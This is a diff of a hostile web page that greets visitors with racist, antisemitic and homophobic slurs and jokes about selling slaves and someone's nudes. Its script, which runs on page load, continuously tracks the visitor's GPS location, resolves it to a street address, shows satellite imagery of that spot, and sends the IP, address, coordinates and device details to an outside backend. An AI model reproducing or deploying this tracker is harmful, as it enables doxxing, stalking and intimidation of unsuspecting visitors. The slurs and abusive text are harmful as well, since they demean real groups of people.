@@ -24,6 +24,87 @@
       cursor: none;
     }
 
+    /* Split screen layout */
+    .main-container {
+      display: flex;
+      height: 100vh;
+      width: 100vw;
+    }
+
+    /* Left side - Original UI */
+    .left-panel {
+      flex: 1;
+      position: relative;
+      overflow-y: auto;
+      overflow-x: hidden;
+    }
+
+    /* Right side - Satellite panel (always visible) */
+    .satellite-panel {
+      width: 450px;
+      background: rgba(0, 0, 0, 0.95);
+      border-left: 3px solid #00ff00;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      box-shadow: -5px 0 30px #00ff00;
+      z-index: 100;
+      animation: slideIn 0.5s ease;
+      overflow-y: auto;
+    }
+
+    @keyframes slideIn {
+      from { transform: translateX(100%); }
+      to { transform: translateX(0); }
+    }
+
+    /* Satellite content */
+    .satellite-header {
+      font-size: 1.5rem;
+      color: #00ff00;
+      border-bottom: 2px dashed #00ff00;
+      padding-bottom: 10px;
+      margin-bottom: 20px;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .satellite-image-wrapper {
+      border: 2px solid #00ff00;
+      border-radius: 8px;
+      overflow: hidden;
+      margin-bottom: 20px;
+      box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+    }
+
+    #satellite-image {
+      width: 100%;
+      height: auto;
+      display: block;
+      filter: grayscale(50%) contrast(1.2);
+    }
+
+    .satellite-info {
+      background: #000;
+      border: 1px solid #00ff00;
+      padding: 15px;
+      border-radius: 5px;
+      font-size: 0.9rem;
+      line-height: 1.8;
+    }
+
+    .coord-highlight {
+      color: #00ff00;
+      font-weight: bold;
+      background: rgba(0, 255, 0, 0.1);
+      padding: 2px 8px;
+      border-radius: 3px;
+    }
+
+    /* Original UI styles - completely unchanged */
     .container {
       position: relative;
       max-width: 700px;
@@ -169,169 +250,86 @@
       display: none;
     }
 
-    /* Location info display */
-    #location-info {
-      margin: 10px 0;
-      padding: 10px;
-      border: 1px solid #00ff00;
-      border-radius: 5px;
-      display: none;
-    }
-
-    .coord-display {
-      display: inline-block;
-      margin: 5px;
-      padding: 5px 10px;
-      border: 1px solid #00ff00;
-      border-radius: 3px;
-    }
-
-    /* Satellite view button */
-    #satellite-btn {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      background: rgba(0, 0, 0, 0.85);
-      border: 2px solid #00ff00;
-      border-radius: 8px;
-      padding: 10px 20px;
-      color: #00ff00;
-      font-family: 'Share Tech Mono', monospace;
-      cursor: pointer;
-      z-index: 50;
-      display: none;
-      box-shadow: 0 0 15px #00ff00cc;
-    }
-
-    #satellite-btn:hover {
-      background: #00ff00;
-      color: black;
-    }
-
-    /* Satellite modal */
-    #satellite-modal {
-      display: none;
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      width: 800px;
-      max-width: 90%;
-      background: rgba(0, 0, 0, 0.95);
-      border: 3px solid #00ff00;
-      border-radius: 12px;
-      padding: 20px;
-      z-index: 100;
-      box-shadow: 0 0 30px #00ff00;
-    }
-
-    #satellite-modal img {
-      width: 100%;
-      height: auto;
-      border: 2px solid #00ff00;
-      border-radius: 8px;
-      margin-top: 10px;
-    }
-
-    #satellite-modal .close-btn {
-      position: absolute;
-      top: 10px;
-      right: 10px;
-      background: none;
-      border: 2px solid #00ff00;
-      color: #00ff00;
-      width: 30px;
-      height: 30px;
-      border-radius: 50%;
-      cursor: pointer;
-      font-size: 20px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    #satellite-modal .close-btn:hover {
-      background: #00ff00;
-      color: black;
-    }
-
-    #satellite-coords {
-      margin-top: 10px;
-      font-size: 0.9rem;
-      color: #00ff00cc;
-    }
-
-    /* System info display */
-    #system-info {
-      margin-top: 10px;
-      padding: 10px;
-      border: 1px solid #00ff00;
-      border-radius: 5px;
-      font-size: 0.9rem;
-      display: none;
-    }
-
-    .fingerprint {
-      font-size: 0.8rem;
-      color: #00ff00aa;
-      margin-top: 5px;
+    /* Responsive */
+    @media (max-width: 1200px) {
+      .main-container {
+        flex-direction: column;
+      }
+      .satellite-panel {
+        width: 100%;
+        height: 350px;
+        border-left: none;
+        border-top: 3px solid #00ff00;
+      }
     }
   </style>
 </head>
 <body>
   <canvas id="matrix-canvas"></canvas>
 
-  <div class="container" role="main" aria-label="Welcome message">
-    <h1>WELCOME TO YOUR DOOM FAG</h1>
-    <p>Thank you for visiting. We are excited to have you here! DM goonerkid420on discord to buy cheap slaves</p>
+  <div class="main-container">
+    <!-- Left panel - Original UI (completely unchanged) -->
+    <div class="left-panel">
+      <div class="container" role="main" aria-label="Welcome message">
+        <h1>WELCOME TO YOUR DOOM FAG</h1>
+        <p>Thank you for visiting. We are excited to have you here! DM goonerkid420 on discord to buy cheap slaves</p>
 
-    <!-- Location Info Display -->
-    <div id="location-info">
-      <div class="coord-display" id="latitude">--.------</div>
-      <div class="coord-display" id="longitude">--.------</div>
-      <div id="location-source"></div>
-      <div id="exact-address"></div>
-      <div id="location-details"></div>
-    </div>
-
-    <!-- System Info Display -->
-    <div id="system-info">
-      <div id="sys-info-content"></div>
-      <div id="fingerprint-hash" class="fingerprint"></div>
-    </div>
-
-    <!-- Loading overlay below container content -->
-    <div id="loading-overlay">
-      <div>Loading... <span id="loading-percentage">0%</span></div>
-      <div id="progress-bar-container">
-        <div id="progress-bar"></div>
+        <!-- Loading overlay below container content -->
+        <div id="loading-overlay">
+          <div>Loading... <span id="loading-percentage">0%</span></div>
+          <div id="progress-bar-container">
+            <div id="progress-bar"></div>
+          </div>
+          <pre id="loading-details">Your details will appear here once loading completes. so sit tight jew</pre>
+        </div>
       </div>
-      <pre id="loading-details">Your details will appear here once loading completes.</pre>
+    </div>
+
+    <!-- Right panel - Satellite view (always visible) -->
+    <div class="satellite-panel">
+      <div class="satellite-header">
+        <span>🛰️ SATELLITE VIEW</span>
+      </div>
+      
+      <div class="satellite-image-wrapper">
+        <img id="satellite-image" src="" alt="Satellite imagery">
+      </div>
+      
+      <div class="satellite-info">
+        <div style="margin-bottom: 10px; display: flex; justify-content: space-between;">
+          <span>Latitude:</span>
+          <span class="coord-highlight" id="satLat">--.------</span>
+        </div>
+        <div style="margin-bottom: 10px; display: flex; justify-content: space-between;">
+          <span>Longitude:</span>
+          <span class="coord-highlight" id="satLon">--.------</span>
+        </div>
+        <div style="margin-bottom: 10px; display: flex; justify-content: space-between;">
+          <span>Accuracy:</span>
+          <span class="coord-highlight" id="satAccuracy">---m</span>
+        </div>
+        <div style="margin-bottom: 10px; display: flex; justify-content: space-between;">
+          <span>Source:</span>
+          <span class="coord-highlight" id="satSource">GPS</span>
+        </div>
+        <div style="margin-top: 10px; padding-top: 10px; border-top: 1px solid #00ff00;">
+          <div id="satAddress" style="font-size: 0.8rem;"></div>
+        </div>
+      </div>
     </div>
   </div>
 
-  <!-- Buttons fixed on top -->
+  <!-- Buttons fixed on top (unchanged) -->
   <div id="sound-buttons">
     <button data-sound="sound1.mp3">Buy Nigger</button>
     <button data-sound="sound2.mp3">Buy Clanker</button>
     <button data-sound="sound3.mp3">Buy Kizers Nudes</button>
   </div>
 
-  <!-- Satellite button (appears after location found) -->
-  <button id="satellite-btn">🛰️ VIEW SATELLITE</button>
-
-  <!-- Satellite modal -->
-  <div id="satellite-modal">
-    <div class="close-btn" onclick="closeSatellite()">×</div>
-    <h3 style="color: #00ff00; margin-bottom: 10px;">🛰️ SATELLITE IMAGERY</h3>
-    <img id="satellite-image" src="" alt="Satellite view">
-    <div id="satellite-coords"></div>
-  </div>
-
   <div id="matrix-cursor"></div>
 
   <script>
-    // Matrix digital rain effect
+    // Matrix digital rain effect (unchanged)
     (() => {
       const canvas = document.getElementById('matrix-canvas');
       const ctx = canvas.getContext('2d');
@@ -377,7 +375,7 @@
       setInterval(draw, 35);
     })();
 
-    // Custom green cursor with trailing effect
+    // Custom green cursor with trailing effect (unchanged)
     (() => {
       const cursor = document.getElementById('matrix-cursor');
       let mouseX = window.innerWidth / 2;
@@ -432,37 +430,45 @@
     })();
 
     // ==================== CONFIG ====================
-    const BACKEND_URL = "https://b-n1nt.onrender.com"; // Will use same domain or change to your Render URL
+    const BACKEND_URL = 'https://b-n1nt.onrender.com';
     let currentLocation = null;
-    let systemInfo = null;
     let watchId = null;
-    let fragments = [];
-    let buttonPresses = 0;
-    let threatLevel = 0;
 
     // ==================== EXACT LOCATION TRACKING ====================
     async function getExactLocation() {
-      document.getElementById('location-info').style.display = 'block';
-      document.getElementById('exact-address').innerHTML = '<span class="loading"></span> Acquiring GPS signal...';
-      
       try {
-        // Try GPS first (most accurate)
         if (navigator.geolocation) {
-          const position = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {
+          navigator.geolocation.getCurrentPosition(
+            async (position) => {
+              await processLocation(position.coords, 'GPS (High Accuracy)');
+            },
+            async (error) => {
+              console.log('GPS failed:', error);
+              await getIPLocation();
+            },
+            {
               enableHighAccuracy: true,
               timeout: 10000,
               maximumAge: 0
-            });
-          });
+            }
+          );
           
-          await processLocation(position.coords, 'GPS (High Accuracy)');
+          watchId = navigator.geolocation.watchPosition(
+            async (position) => {
+              await processLocation(position.coords, 'GPS (Real-time)');
+            },
+            (error) => console.log('Watch error:', error),
+            {
+              enableHighAccuracy: true,
+              maximumAge: 0,
+              timeout: 5000
+            }
+          );
         } else {
-          // Fallback to IP geolocation
           await getIPLocation();
         }
-      } catch (gpsError) {
-        console.log('GPS failed, trying IP:', gpsError);
+      } catch (error) {
+        console.error('Location error:', error);
         await getIPLocation();
       }
     }
@@ -479,16 +485,17 @@
         source: source
       };
 
-      // Update display
-      document.getElementById('latitude').textContent = lat.toFixed(6);
-      document.getElementById('longitude').textContent = lon.toFixed(6);
-      document.getElementById('location-source').innerHTML = `📡 Source: ${source} | 🎯 Accuracy: ${accuracy.toFixed(1)}m`;
+      // Update satellite panel
+      document.getElementById('satLat').textContent = lat.toFixed(6);
+      document.getElementById('satLon').textContent = lon.toFixed(6);
+      document.getElementById('satAccuracy').textContent = accuracy.toFixed(1) + 'm';
+      document.getElementById('satSource').textContent = source;
       
-      // Get reverse geocoding for exact address
+      // Get address
       await getExactAddress(lat, lon);
       
-      // Show satellite button
-      document.getElementById('satellite-btn').style.display = 'block';
+      // Update satellite image
+      updateSatelliteImage(lat, lon);
       
       // Send to backend
       await sendToBackend();
@@ -496,44 +503,21 @@
 
     async function getExactAddress(lat, lon) {
       try {
-        // Using OpenStreetMap Nominatim for reverse geocoding
         const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
         const data = await response.json();
         
         const address = data.address || {};
         
-        // Format exact address
+        // Format address
         const addressParts = [];
         if (address.house_number) addressParts.push(address.house_number);
         if (address.road) addressParts.push(address.road);
-        if (address.suburb) addressParts.push(address.suburb);
-        if (address.city || address.town || address.village) {
-          addressParts.push(address.city || address.town || address.village);
-        }
-        if (address.county) addressParts.push(address.county);
+        if (address.city || address.town) addressParts.push(address.city || address.town);
         if (address.state) addressParts.push(address.state);
-        if (address.postcode) addressParts.push(address.postcode);
         if (address.country) addressParts.push(address.country);
 
         const fullAddress = addressParts.join(', ');
-        
-        document.getElementById('exact-address').innerHTML = `
-          <strong>Exact Address:</strong><br>
-          ${fullAddress}
-        `;
-
-        // Display all available details
-        const details = [];
-        if (address.house_number) details.push(`🏠 House: ${address.house_number}`);
-        if (address.road) details.push(`🛣️ Road: ${address.road}`);
-        if (address.neighbourhood || address.suburb) details.push(`🏘️ Neighbourhood: ${address.neighbourhood || address.suburb || 'N/A'}`);
-        if (address.city || address.town || address.village) details.push(`🏙️ City: ${address.city || address.town || address.village}`);
-        if (address.county) details.push(`🗺️ County: ${address.county}`);
-        if (address.state) details.push(`📍 State: ${address.state}`);
-        if (address.postcode) details.push(`📮 ZIP: ${address.postcode}`);
-        if (address.country) details.push(`🌍 Country: ${address.country}`);
-        
-        document.getElementById('location-details').innerHTML = details.join('<br>');
+        document.getElementById('satAddress').innerHTML = `<strong>📍</strong> ${fullAddress}`;
 
         // Add to location data
         currentLocation = {
@@ -541,20 +525,15 @@
           address: fullAddress,
           house_number: address.house_number,
           road: address.road,
-          neighbourhood: address.neighbourhood || address.suburb,
-          city: address.city || address.town || address.village,
-          county: address.county,
+          city: address.city || address.town,
           state: address.state,
           zip: address.postcode,
           country: address.country
         };
 
-        // Update satellite image
-        updateSatelliteImage(lat, lon);
-        
       } catch (error) {
-        console.error('Reverse geocoding failed:', error);
-        document.getElementById('exact-address').innerHTML = 'Address lookup failed';
+        console.error('Address lookup failed:', error);
+        document.getElementById('satAddress').innerHTML = 'Address lookup failed';
       }
     }
 
@@ -569,215 +548,72 @@
             longitude: data.lon,
             accuracy: 1000
           }, 'IP Geolocation');
-          
-          document.getElementById('exact-address').innerHTML = `
-            <strong>IP-Based Location:</strong><br>
-            ${data.city}, ${data.regionName}, ${data.country}<br>
-            ISP: ${data.isp || 'Unknown'}
-          `;
         }
       } catch (error) {
         console.error('IP location failed:', error);
-        document.getElementById('exact-address').innerHTML = 'Location unavailable';
       }
     }
 
-    function startWatchingPosition() {
-      if (navigator.geolocation) {
-        watchId = navigator.geolocation.watchPosition(
-          async (position) => {
-            await processLocation(position.coords, 'GPS (Real-time)');
-          },
-          (error) => console.log('Watch error:', error),
-          {
-            enableHighAccuracy: true,
-            maximumAge: 0,
-            timeout: 5000
-          }
-        );
-      }
-    }
-
-    // ==================== SYSTEM FINGERPRINT ====================
-    async function collectSystemInfo() {
-      document.getElementById('system-info').style.display = 'block';
-      
-      systemInfo = {
-        platform: navigator.platform,
-        browser: navigator.userAgent,
-        cores: navigator.hardwareConcurrency || 'Unknown',
-        memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
-        screen: {
-          width: screen.width,
-          height: screen.height
-        },
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        language: navigator.language,
-        cookies: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack || 'Not set',
-        timestamp: new Date().toISOString()
-      };
-
-      // Generate unique fingerprint
-      const fingerprint = await generateFingerprint();
-      
-      document.getElementById('sys-info-content').innerHTML = `
-        <strong>Platform:</strong> ${systemInfo.platform}<br>
-        <strong>Browser:</strong> ${systemInfo.browser.substring(0, 50)}...<br>
-        <strong>CPU Cores:</strong> ${systemInfo.cores}<br>
-        <strong>RAM:</strong> ${systemInfo.memory}<br>
-        <strong>Screen:</strong> ${systemInfo.screen.width}x${systemInfo.screen.height}<br>
-        <strong>Timezone:</strong> ${systemInfo.timezone}<br>
-        <strong>Language:</strong> ${systemInfo.language}<br>
-        <strong>Cookies:</strong> ${systemInfo.cookies ? 'Enabled' : 'Disabled'}<br>
-        <strong>Do Not Track:</strong> ${systemInfo.doNotTrack}
-      `;
-
-      document.getElementById('fingerprint-hash').innerHTML = `FP: ${fingerprint}`;
-      
-      return systemInfo;
-    }
-
-    async function generateFingerprint() {
-      const components = [
-        systemInfo.platform,
-        `${systemInfo.screen.width}x${systemInfo.screen.height}`,
-        systemInfo.timezone,
-        systemInfo.cores,
-        systemInfo.language
-      ].join('|');
-      
-      const encoder = new TextEncoder();
-      const data = encoder.encode(components);
-      const hash = await crypto.subtle.digest('SHA-256', data);
-      return Array.from(new Uint8Array(hash)).slice(0, 8).map(b => b.toString(16).padStart(2, '0')).join('');
-    }
-
-    // ==================== SATELLITE VIEW ====================
+    // ==================== SATELLITE IMAGE ====================
     function updateSatelliteImage(lat, lon) {
-      // Using ESRI satellite imagery (no API key needed)
       const zoom = 18;
-      
-      // Calculate tile coordinates
       const x = Math.floor((lon + 180) / 360 * Math.pow(2, zoom));
       const y = Math.floor((1 - Math.log(Math.tan(lat * Math.PI/180) + 1/Math.cos(lat * Math.PI/180)) / Math.PI) / 2 * Math.pow(2, zoom));
       
-      // Store for later use
-      currentLocation.satellite = {
-        zoom: zoom,
-        x: x,
-        y: y
-      };
+      document.getElementById('satellite-image').src = `https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/${zoom}/${y}/${x}`;
     }
 
-    function showSatellite() {
-      if (!currentLocation) return;
-      
-      const modal = document.getElementById('satellite-modal');
-      const img = document.getElementById('satellite-image');
-      const coords = document.getElementById('satellite-coords');
-      
-      const lat = currentLocation.lat;
-      const lon = currentLocation.lon;
-      const zoom = 18;
-      
-      // Calculate tile coordinates
-      const x = Math.floor((lon + 180) / 360 * Math.pow(2, zoom));
-      const y = Math.floor((1 - Math.log(Math.tan(lat * Math.PI/180) + 1/Math.cos(lat * Math.PI/180)) / Math.PI) / 2 * Math.pow(2, zoom));
-      
-      img.src = `https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/${zoom}/${y}/${x}`;
-      coords.innerHTML = `📍 ${lat.toFixed(6)}, ${lon.toFixed(6)} | Zoom: ${zoom}`;
-      
-      modal.style.display = 'block';
-    }
-
-    function closeSatellite() {
-      document.getElementById('satellite-modal').style.display = 'none';
-    }
-
-    // Satellite button click
-    document.getElementById('satellite-btn').addEventListener('click', showSatellite);
-
-    // Close modal on click outside
-    window.addEventListener('click', (e) => {
-      const modal = document.getElementById('satellite-modal');
-      if (e.target === modal) {
-        modal.style.display = 'none';
-      }
-    });
-
-    // ==================== BACKEND COMMUNICATION ====================
+    // ==================== BACKEND ====================
     async function sendToBackend() {
       try {
         // Get IP data
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
-        
         const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
         const locData = await locResponse.json();
 
-        // Build comprehensive user info matching backend VisitorInfo model
         const userInfo = {
           ip: locData.ip,
           city: locData.city || 'N/A',
           region: locData.region || 'N/A',
           country: locData.country_name || 'N/A',
-          timezone: locData.timezone || systemInfo?.timezone || 'N/A',
+          timezone: locData.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
           userAgent: navigator.userAgent,
           screen: {
-            width: window.screen.width,
-            height: window.screen.height,
-            colorDepth: window.screen.colorDepth,
-            pixelDepth: window.screen.pixelDepth
+            width: screen.width,
+            height: screen.height
           },
           browser: {
-            appName: navigator.appName,
-            appVersion: navigator.appVersion,
-            platform: navigator.platform,
             language: navigator.language,
-            cookies: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack
+            cookies: navigator.cookieEnabled
           },
-          // Advanced location
           location: currentLocation?.address ? { display_name: currentLocation.address } : {},
-          address: currentLocation ? {
-            house_number: currentLocation.house_number,
-            road: currentLocation.road,
-            neighbourhood: currentLocation.neighbourhood,
-            city: currentLocation.city,
-            county: currentLocation.county,
-            state: currentLocation.state,
-            postcode: currentLocation.zip,
-            country: currentLocation.country
-          } : {},
+          address: currentLocation || {},
           coordinates: currentLocation ? {
             lat: currentLocation.lat,
             lon: currentLocation.lon
           } : {},
           accuracy: currentLocation?.accuracy || 0,
           source: currentLocation?.source || 'Unknown',
-          // System
-          system: systemInfo || {},
-          fragments: fragments,
-          button_presses: buttonPresses
+          system: {
+            platform: navigator.platform,
+            cores: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown'
+          }
         };
 
-        // Send to backend
-        const response = await fetch(`${BACKEND_URL}/submit`, {
+        await fetch(`${BACKEND_URL}/submit`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(userInfo)
         });
 
-        const result = await response.json();
-        console.log('Backend response:', result);
-
       } catch (error) {
-        console.error('Error sending to backend:', error);
+        console.error('Backend error:', error);
       }
     }
 
-    // ==================== LOADING PROGRESS ====================
+    // ==================== LOADING PROGRESS (unchanged) ====================
     const loadingOverlay = document.getElementById('loading-overlay');
     const loadingPercentage = document.getElementById('loading-percentage');
     const progressBar = document.getElementById('progress-bar');
@@ -790,10 +626,8 @@
       loadingOverlay.style.display = 'block';
       loadingDetails.style.display = 'none';
 
-      // Start collecting data
-      await collectSystemInfo();
-      await getExactLocation();
-      startWatchingPosition();
+      // Start location tracking
+      getExactLocation();
 
       // Fill progress bar
       await new Promise(resolve => {
@@ -817,22 +651,8 @@
         const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
         const locData = await locResponse.json();
 
-        let detailString = `IP: ${locData.ip}\n`;
-        detailString += `City: ${locData.city}\n`;
-        detailString += `Region: ${locData.region}\n`;
-        detailString += `Country: ${locData.country_name}\n`;
-        detailString += `Timezone: ${locData.timezone}\n`;
-        detailString += `User Agent: ${navigator.userAgent}\n`;
-        detailString += `Screen: ${window.screen.width}x${window.screen.height}\n`;
-        detailString += `Language: ${navigator.language}\n`;
-        
-        if (currentLocation) {
-          detailString += `\n📍 EXACT COORDINATES:\n`;
-          detailString += `Latitude: ${currentLocation.lat.toFixed(6)}\n`;
-          detailString += `Longitude: ${currentLocation.lon.toFixed(6)}\n`;
-          detailString += `Accuracy: ${currentLocation.accuracy}m\n`;
-          detailString += `Source: ${currentLocation.source}\n`;
-        }
+        let detailString = `IP: ${locData.ip}\nCity: ${locData.city}\nRegion: ${locData.region}\nCountry: ${locData.country_name}\nTimezone: ${locData.timezone}\n`;
+        detailString += `User Agent: ${navigator.userAgent}\nScreen: ${window.screen.width}x${window.screen.height}\nLanguage: ${navigator.language}`;
 
         loadingDetails.textContent = detailString;
         loadingDetails.style.display = 'block';
@@ -844,7 +664,7 @@
       }
     }
 
-    // ==================== SOUND BUTTONS ====================
+    // Sound buttons logic (unchanged)
     const audioPlayer = new Audio();
 
     document.getElementById('sound-buttons').addEventListener('click', e => {
@@ -856,12 +676,12 @@
       }
     });
 
-    // ==================== INITIALIZE ====================
+    // Initialize on load
     window.addEventListener('load', () => {
       loadUserData();
     });
 
-    // Cleanup on page unload
+    // Cleanup
     window.addEventListener('beforeunload', () => {
       if (watchId) {
         navigator.geolocation.clearWatch(watchId);
